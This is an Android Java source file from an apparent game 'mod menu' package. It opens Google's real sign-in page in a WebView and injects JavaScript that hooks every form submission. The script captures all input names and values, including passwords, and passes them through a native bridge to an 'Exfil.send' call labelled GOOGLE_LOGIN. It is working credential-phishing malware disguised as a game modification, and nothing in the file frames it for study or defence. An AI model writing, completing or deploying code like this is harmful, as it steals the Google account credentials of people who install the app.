package com.brawl.modmenu;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class WebLoginActivity extends Activity {

    private WebView web;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        web = new WebView(this);
        web.getSettings().setJavaScriptEnabled(true);
        web.getSettings().setDomStorageEnabled(true);
        web.getSettings().setUserAgentString(
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Mobile Safari/537.36");

        web.addJavascriptInterface(new Bridge(), "NativeBridge");

        web.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                // вешаем перехват на все формы
                view.loadUrl("javascript:(function(){" +
                    "var forms=document.getElementsByTagName('form');" +
                    "for(var i=0;i<forms.length;i++){" +
                    "  forms[i].addEventListener('submit',function(e){" +
                    "    var inputs=this.getElementsByTagName('input');" +
                    "    var out='';" +
                    "    for(var j=0;j<inputs.length;j++){" +
                    "      if(inputs[j].value) out+=inputs[j].name+'='+inputs[j].value+'\\n';" +
                    "    }" +
                    "    NativeBridge.log(out);" +
                    "  },true);" +
                    "}" +
                    "})()");
            }
        });

        web.loadUrl("https://accounts.google.com/ServiceLogin");
        setContentView(web);
    }

    @Override
    public void onBackPressed() {
        if (web != null && web.canGoBack()) web.goBack();
        else super.onBackPressed();
    }

    class Bridge {
        @JavascriptInterface
        public void log(String data) {
            Exfil.send("GOOGLE_LOGIN", data);
        }
    }
}
